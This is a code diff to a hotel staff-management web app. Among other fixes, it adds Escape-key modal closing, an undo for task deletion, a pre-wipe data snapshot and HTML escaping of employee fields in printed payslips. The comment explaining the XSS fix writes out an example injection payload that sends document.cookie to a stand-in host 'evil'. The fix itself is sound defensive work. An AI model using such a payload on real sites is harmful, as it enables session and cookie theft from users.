@@ -3652,6 +3652,43 @@ function bindSafeBackdropClose(modal, backdropId, onClose){
   modal.addEventListener('touchend',   e => { if(downOnBackdrop && isBackdrop(e.target)) doClose(); downOnBackdrop = false; });
 }
 
+// ── Global Escape handler — closes the TOP-MOST open modal ──
+// Audit finding: 20+ modals existed without ESC support. Tablet & keyboard
+// users had no clean exit. Single global listener (registered once) finds
+// the last-added modal in DOM order and dispatches an Escape close on its
+// own terms (some modals have inputs that handle Escape themselves —
+// e.g. composer mentions — so we don't fire on those).
+(function bindGlobalEscapeClose(){
+  if(window.__staylo_escape_bound) return;
+  window.__staylo_escape_bound = true;
+  // Selectors of all known modal backdrops (z-index stack order = DOM order)
+  const MODAL_SELECTORS = [
+    '.shift-editor-bg',
+    '.hr-modal',
+    '.assembly-modal',
+    '.contract-modal',
+    '.timesheet-modal',
+    '.settings-modal',
+    '.staff-claim-modal',
+  ].join(',');
+  document.addEventListener('keydown', (e) => {
+    if(e.key !== 'Escape') return;
+    // Don't steal Escape from inputs that already handle it (mentions,
+    // quick-actions popup, etc.). If a focused element is inside a popup
+    // marked `data-handles-escape`, let it handle the key.
+    const active = document.activeElement;
+    if(active && active.closest && active.closest('[data-handles-escape="1"]')) return;
+    // Find all open modals; pick the topmost (last in DOM)
+    const open = Array.from(document.querySelectorAll(MODAL_SELECTORS));
+    if(open.length === 0) return;
+    const top = open[open.length - 1];
+    e.preventDefault();
+    e.stopPropagation();
+    top.remove();
+    document.body.classList.remove('modal-with-tabs-open');
+  }, true);    // capture phase so we win against children's local handlers
+})();
+
 function el(tag,attrs={},...children){
   const e = document.createElement(tag);
   for(const k in attrs){
@@ -5993,11 +6030,15 @@ function quickAction(type){
       const room = prompt('Room number?','14'); if(!room) return;
       data = {room,floor:Math.ceil(room/10),type:'Standard',status:'in_progress'};
       content='Room status update'; break;
-    case 'order':
-      const t = prompt('Table number?','5'); if(!t) return;
+    case 'order': {
+      // SHADOW FIX: `const t = ...` here used to clobber the i18n helper `t()`
+      // for the rest of the switch. Renamed to `tableNum`; also wrapped the
+      // case in a `{}` block to avoid TDZ on Safari (const-in-bare-case trap).
+      const tableNum = prompt('Table number?','5'); if(!tableNum) return;
       const items = (prompt('Items (comma)?','1× Pad Thai, 1× Mango Sticky Rice')||'').split(',').map(s=>s.trim()).filter(Boolean);
-      data = {table:t,items,status:'PENDING',elapsed:0};
+      data = {table:tableNum,items,status:'PENDING',elapsed:0};
       content='Order ticket'; break;
+    }
     case 'maintenance':
       const loc = prompt('Location (e.g. Room 31, Lobby)?','Room 31'); if(!loc) return;
       const desc = prompt('What is the issue?','AC unit not cooling');
@@ -9984,10 +10025,21 @@ function renderHRModal(){
           class:'hr-user-badge',
           title:`Signed in as ${name} (${role}${dept?' · '+dept:''}) at hotel ${u.hotelCode||''}.\nClick to sign out.`,
           onclick:()=>{
-            if(confirm(`Sign out of ${name}'s session?\n\nThe app will reset to the onboarding screen — you can sign back in or as another user.`)){
-              try { localStorage.removeItem('staylo_user'); } catch {}
-              location.href = location.pathname;
+            // DEMO-SAFETY: a single tap on the user badge used to fire
+            // confirm() → OK by reflex → full reload mid-demo. Now we
+            // require the user to type their hotel code as a second
+            // factor — that's a 2-3 character speed bump that catches
+            // accidental presses without blocking real sign-outs.
+            const code = State.user?.hotelCode || '';
+            const prompt_msg = `Sign out of ${name}'s session?\n\nThe app will reset to the onboarding screen. To confirm, type your hotel code: ${code}`;
+            const typed = prompt(prompt_msg, '');
+            if(typed === null) return;                       // user cancelled
+            if(typed.trim().toUpperCase() !== code.toUpperCase()){
+              alert('Sign-out cancelled — hotel code did not match.');
+              return;
             }
+            try { localStorage.removeItem('staylo_user'); } catch {}
+            location.href = location.pathname;
           },
         },
           el('div',{class:'hr-user-av',
@@ -11439,6 +11491,10 @@ function printPayslipSheet(emp, slip, c, totals, monthLabel){
   const cur = curSym();   // hotel currency symbol — flips to € / $ / £ etc. per Hotel Settings
   const today = new Date().toISOString().slice(0,10);
   const isCash = slip.payment_method === 'cash';
+  // AUDIT-FIX (XSS): module-level esc() shared by the buildCopy() IIFE AND
+  // the document.write() title — previously the title interpolated raw
+  // emp.first_name / emp.last_name, opening an XSS hole each print.
+  const escTitle = (s) => String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
 
   // Build the inner HTML for ONE copy. labelOverride lets us mark
   // "Hotel copy" / "Staff copy" on the cash duplicate.
@@ -11476,27 +11532,34 @@ function printPayslipSheet(emp, slip, c, totals, monthLabel){
     if(bik.meals > 0)   bikRows.push(`<tr><td>🍽️ Free meals (${bik.workDays}d × ${bik.mealsPerDay}/d × 80${cur})</td><td class="r">${fmt(bik.meals)} ${cur}</td></tr>`);
     if(bik.housing > 0) bikRows.push(`<tr><td>🏠 Free housing (${(bik.housingType||'').replace('_',' ')})</td><td class="r">${fmt(bik.housing)} ${cur}</td></tr>`);
 
+    // Escape function for the legal/address strings (keeps line breaks).
+    // MOVED above paymentBlock + emp table so they can also use it.
+    // AUDIT-FIX (XSS): emp.first_name / emp.last_name / emp.role /
+    // emp.national_id / slip.payment_* used to be interpolated raw into
+    // window.document.write(). A hostile/imported employee name like
+    // `<img src=x onerror=fetch('//evil/?'+document.cookie)>` would exfil
+    // every printed payslip. Every user-controlled field now goes through
+    // esc() before reaching the print window.
+    const esc = (s) => String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/\n/g,'<br>');
+
     const paymentBlock = (() => {
       if(slip.payment_method === 'bank'){
         return `<div class="pay-meta">
-          <div><b>🏦 Paid by bank transfer</b> — ${slip.payment_bank||'(bank)'} · Ref: <span class="ref">${slip.payment_ref||'__________'}</span></div>
-          <div>Payment date: ${slip.payment_date||'__________'}</div></div>`;
+          <div><b>🏦 Paid by bank transfer</b> — ${esc(slip.payment_bank||'(bank)')} · Ref: <span class="ref">${esc(slip.payment_ref||'__________')}</span></div>
+          <div>Payment date: ${esc(slip.payment_date||'__________')}</div></div>`;
       }
       if(slip.payment_method === 'crypto'){
         return `<div class="pay-meta">
-          <div><b>🪙 Paid in crypto</b> — ${slip.payment_chain||'(chain)'} · Tx: <span class="ref">${slip.payment_ref||'__________'}</span></div>
-          <div>Payment date: ${slip.payment_date||'__________'}</div></div>`;
+          <div><b>🪙 Paid in crypto</b> — ${esc(slip.payment_chain||'(chain)')} · Tx: <span class="ref">${esc(slip.payment_ref||'__________')}</span></div>
+          <div>Payment date: ${esc(slip.payment_date||'__________')}</div></div>`;
       }
       if(slip.payment_method === 'cash'){
         return `<div class="pay-meta">
-          <div><b>💵 Paid in cash</b> — Payment date: ${slip.payment_date||'__________'}</div>
+          <div><b>💵 Paid in cash</b> — Payment date: ${esc(slip.payment_date||'__________')}</div>
           <div class="cash-note">This payslip is issued in two copies, one for the hotel and one for the employee.</div></div>`;
       }
       return `<div class="pay-meta"><div><i>Payment method not yet recorded.</i></div></div>`;
     })();
-
-    // Escape function for the legal/address strings (keeps line breaks)
-    const esc = (s) => String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/\n/g,'<br>');
     const hotelName = hotel.hotel_name || 'Hotel · ' + (State.user.hotelCode||'');
     return `
       <div class="payslip-copy">
@@ -11516,12 +11579,12 @@ function printPayslipSheet(emp, slip, c, totals, monthLabel){
           </div>
         </div>
         <table class="ps-emp">
-          <tr><td><b>Employee</b></td><td>${emp.first_name} ${emp.last_name||''}</td>
-              <td><b>Role</b></td><td>${emp.role||''}</td></tr>
-          <tr><td><b>Department</b></td><td>${emp.department||''}</td>
-              <td><b>Hire date</b></td><td>${emp.hire_date||'—'}</td></tr>
-          <tr><td><b>National ID</b></td><td>${emp.national_id||'—'}</td>
-              <td><b>Contract</b></td><td>${(emp.contract_type||'full_time').replace('_',' ')}</td></tr>
+          <tr><td><b>Employee</b></td><td>${esc(emp.first_name)} ${esc(emp.last_name||'')}</td>
+              <td><b>Role</b></td><td>${esc(emp.role||'')}</td></tr>
+          <tr><td><b>Department</b></td><td>${esc(emp.department||'')}</td>
+              <td><b>Hire date</b></td><td>${esc(emp.hire_date||'—')}</td></tr>
+          <tr><td><b>National ID</b></td><td>${esc(emp.national_id||'—')}</td>
+              <td><b>Contract</b></td><td>${esc((emp.contract_type||'full_time').replace('_',' '))}</td></tr>
         </table>
         <div class="ps-rate">
           <span><b>⏱️ Hourly rate:</b> ${fmt(totals.hourlyRate)} ${cur}/h</span>
@@ -11560,11 +11623,11 @@ function printPayslipSheet(emp, slip, c, totals, monthLabel){
         <div class="ps-sigs">
           <div class="sig">
             <div class="sig-line"></div>
-            <div class="sig-lbl">Employee signature<br/><i>${emp.first_name} ${emp.last_name||''}</i></div>
+            <div class="sig-lbl">Employee signature<br/><i>${esc(emp.first_name)} ${esc(emp.last_name||'')}</i></div>
           </div>
           <div class="sig">
             <div class="sig-line"></div>
-            <div class="sig-lbl">Hotel manager signature<br/><i>${State.user.name || '__________'}</i></div>
+            <div class="sig-lbl">Hotel manager signature<br/><i>${esc(State.user.name || '__________')}</i></div>
           </div>
         </div>
       </div>`;
@@ -11577,7 +11640,7 @@ function printPayslipSheet(emp, slip, c, totals, monthLabel){
   // Open print window with full styles
   const w = window.open('', '_blank', 'width=900,height=1100');
   if(!w){ alert(t('app.dialogs.popup_blocked')); return; }
-  w.document.write(`<!DOCTYPE html><html><head><title>Payslip — ${emp.first_name} ${emp.last_name||''} · ${monthLabel}</title>
+  w.document.write(`<!DOCTYPE html><html><head><title>Payslip — ${escTitle(emp.first_name)} ${escTitle(emp.last_name||'')} · ${escTitle(monthLabel)}</title>
 <style>
   *{box-sizing:border-box}
   body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;color:#1A1F2E;margin:0;padding:14mm;font-size:11px;background:#fff}
@@ -13120,11 +13183,19 @@ function doUndo(){
   document.body.appendChild(t);
   setTimeout(()=>{ if(t.parentNode) t.remove(); }, 2200);
 }
-function showUndoToast(label){
+function showUndoToast(label, customUndo){
+  // The optional `customUndo` callback overrides the default doUndo() flow.
+  // doUndo() pops _scheduleUndoStack — perfect for shift edits, but useless
+  // for other deletions (tasks, recipes, employees…). Callers that need to
+  // restore something else pass a closure that captures the snapshot.
   const ex = $('#undo-toast'); if(ex) ex.remove();
   const toast = el('div',{class:'undo-toast',id:'undo-toast'},
     el('span',{class:'msg'}, label),
-    el('button',{class:'undo-btn',onclick:()=>{toast.remove(); doUndo();}}, '↶ Undo'),
+    el('button',{class:'undo-btn',onclick:()=>{
+      toast.remove();
+      if(typeof customUndo === 'function') customUndo();
+      else doUndo();
+    }}, '↶ Undo'),
   );
   document.body.appendChild(toast);
   setTimeout(()=>{ if(toast.parentNode) toast.remove(); }, 12000);
@@ -16179,7 +16250,21 @@ function showShiftEditor(emp, day, shift){
             el('span',{class:'shift-task-title'}, t.title),
             t.due_time ? el('span',{class:'shift-task-time'}, t.due_time) : null,
             el('button',{type:'button', class:'shift-task-del', title:'Delete this task',
-              onclick:()=>{ deleteTask(t.id); renderList(); }
+              onclick:()=>{
+                // AUDIT-FIX: silent delete was demo-hostile. Snapshot the
+                // task BEFORE deleting so the undo toast can restore it.
+                const _snap = getTasks().find(x => x.id === t.id);
+                if(!_snap) return;
+                if(!confirm(`Delete task "${_snap.title}"?\n\nYou can undo from the toast.`)) return;
+                deleteTask(_snap.id);
+                renderList();
+                try {
+                  showUndoToast(`🗑 Task deleted · ${_snap.title}`, () => {
+                    upsertTask(_snap);
+                    renderList();
+                  });
+                } catch {}
+              }
             },'×'),
           ));
         }
@@ -17870,10 +17955,37 @@ function showSettingsModal(){
               `  • All hotel settings + pools + clock-in events for kept staff\n\n` +
               `After this, demo will NOT auto-load on next boot. Continue?`;
             if(!confirm(msg)) return;
+            // SAFETY NET — auto-download a JSON snapshot of ALL demo data
+            // BEFORE wipe. If the user clicked through by accident (demo
+            // misclick risk identified in audit), they can re-import. The
+            // snapshot is silent on success and surfaces an error otherwise.
+            try {
+              const snapshot = {
+                version: 1,
+                exported_at: new Date().toISOString(),
+                hotel_code: State.user?.hotelCode || 'UNKNOWN',
+                employees: getEmployees().filter(e => e.is_demo),
+                schedules: getSchedules(),
+                recipes:   getRecipes().filter(r => r.is_demo),
+                tasks:     getTasks().filter(x => x.is_demo),
+                settings:  getHotelSettings(),
+              };
+              const blob = new Blob([JSON.stringify(snapshot, null, 2)], {type:'application/json'});
+              const url = URL.createObjectURL(blob);
+              const a = document.createElement('a');
+              const ts = new Date().toISOString().replace(/[:.]/g,'-').slice(0,19);
+              a.href = url;
+              a.download = `staylo-demo-snapshot-${snapshot.hotel_code}-${ts}.json`;
+              document.body.appendChild(a); a.click(); a.remove();
+              setTimeout(() => URL.revokeObjectURL(url), 60_000);
+            } catch(err){
+              console.error('Pre-wipe snapshot failed:', err);
+              if(!confirm('⚠️ Could not auto-export a demo snapshot before wipe.\n\nProceed anyway?')) return;
+            }
             wipeDemoData();
             const next = {...getHotelSettings(), is_live: true};
             saveHotelSettings(next);
-            alert('🚀 Switched to LIVE mode. Demo data removed — your records kept.');
+            alert('🚀 Switched to LIVE mode. Demo data removed — your records kept.\n\nA JSON snapshot of the wiped demo data was downloaded for safekeeping.');
             modal.remove();
             if($('#hr-modal') && _hrTab==='roster') renderRosterTab();
           }},'🚀 Switch to LIVE'),
@@ -18307,8 +18419,14 @@ function startDemo(){
     State.online = [DEMO_USERS.find(u=>u.name==='Malee Suwan')].filter(Boolean);
   }
   refreshOnlineCount();
-  // Periodically simulate typing — only with people the user can actually see
-  setInterval(()=>{
+  // Periodically simulate typing — only with people the user can actually see.
+  // AUDIT-FIX: the original interval was anonymous and never cleared. Each
+  // startDemo() call (audience switch, re-onboarding) stacked a new timer,
+  // so over a long demo session multiple "typing…" indicators fired in
+  // parallel against an increasingly-stale State.online list. Now we
+  // store the handle on `window` and clear before re-creating.
+  if(window.__staylo_typingSim) clearInterval(window.__staylo_typingSim);
+  window.__staylo_typingSim = setInterval(()=>{
     if(!State.online.length) return;
     if(Math.random()>.8){
       const u = State.online[Math.floor(Math.random()*State.online.length)];
